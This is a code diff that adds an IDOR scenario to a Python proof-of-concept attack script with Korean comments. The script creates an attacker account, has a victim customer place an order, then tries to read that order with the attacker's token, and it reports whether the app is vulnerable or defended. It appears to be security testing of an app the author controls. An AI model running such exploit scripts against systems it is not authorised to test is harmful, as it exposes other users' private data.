@@ -147,12 +147,52 @@ def attack_xss(base, admin_user, admin_pass):
         print(f"\n[RESULT] 🟢 DEFENDED — 입력이 이스케이프/제거됨(스크립트 무력화).")
         return 0
 
+def attack_idor(base, admin_user, admin_pass):
+    print("=== AIR PoC: IDOR (타 고객 주문 무단 열람) ===")
+    admin_tok, _ = login(base, admin_user, admin_pass)
+    tid, pid, cuA, cpA = prepare(base, admin_tok)   # custA = 피해자
+
+    # 공격자 custB 생성
+    suffix = f"{int(time.time())}{random.randint(100, 999)}"
+    cuB, cpB = f"atk-idor-{suffix}", "attacker123!"
+    st, j = call(base, 'POST', '/api/v1/users', admin_tok,
+                 {'username': cuB, 'password': cpB, 'role': 'customer',
+                  'displayName': 'idor-attacker', 'tenantId': tid})
+    if st not in (200, 201):
+        raise SystemExit(f"[!] 공격자 생성 실패: {st} {j}")
+
+    # custA: 잔액 충전(요청→admin 승인) 후 주문 생성
+    a_tok, _ = login(base, cuA, cpA)
+    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/charge-requests', a_tok, {'amount': 100000})
+    cid = (j or {}).get('data', {}).get('id')
+    call(base, 'POST', f'/api/v1/tenants/{tid}/charge-requests/{cid}/approve', admin_tok)
+    st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/orders', a_tok,
+                 {'items': [{'productId': pid, 'quantity': 1}]})
+    oid = (j or {}).get('data', {}).get('id')
+    if not oid:
+        raise SystemExit(f"[!] custA 주문 생성 실패: {st} {j}")
+    print(f"[*] 피해자(custA) 주문 생성: order={oid}")
+
+    # custB: custA 의 주문을 id 로 무단 조회
+    b_tok, _ = login(base, cuB, cpB)
+    print(f"[>] 공격자(custB)가 custA 주문 단건조회: GET /orders/{oid}")
+    st, j = call(base, 'GET', f'/api/v1/tenants/{tid}/orders/{oid}', b_tok)
+    got = (j or {}).get('data', {}).get('id') if (j and j.get('data')) else None
+    print(f"[<] 응답: HTTP {st}, data.id={got}")
+
+    if st == 200 and got == oid:
+        print(f"\n[RESULT] 🔴 VULNERABLE — 타 고객 주문이 그대로 노출됨(IDOR).")
+        return 1
+    else:
+        print(f"\n[RESULT] 🟢 DEFENDED — 소유자 검증으로 차단(HTTP {st}).")
+        return 0
+
 def main():
     ap = argparse.ArgumentParser(description="AIR PoC 공격 모듈")
     ap.add_argument('--base', required=True, help='타깃 베이스 URL (예: http://13.125.184.233)')
     ap.add_argument('--admin-user', required=True)
     ap.add_argument('--admin-pass', required=True)
-    ap.add_argument('scenario', choices=['negative-qty', 'sqli', 'xss'])
+    ap.add_argument('scenario', choices=['negative-qty', 'sqli', 'xss', 'idor'])
     a = ap.parse_args()
     if a.scenario == 'negative-qty':
         sys.exit(attack_negative_qty(a.base, a.admin_user, a.admin_pass))
@@ -160,6 +200,8 @@ def main():
         sys.exit(attack_sqli(a.base, a.admin_user, a.admin_pass))
     elif a.scenario == 'xss':
         sys.exit(attack_xss(a.base, a.admin_user, a.admin_pass))
+    elif a.scenario == 'idor':
+        sys.exit(attack_idor(a.base, a.admin_user, a.admin_pass))
 
 if __name__ == '__main__':
     main()
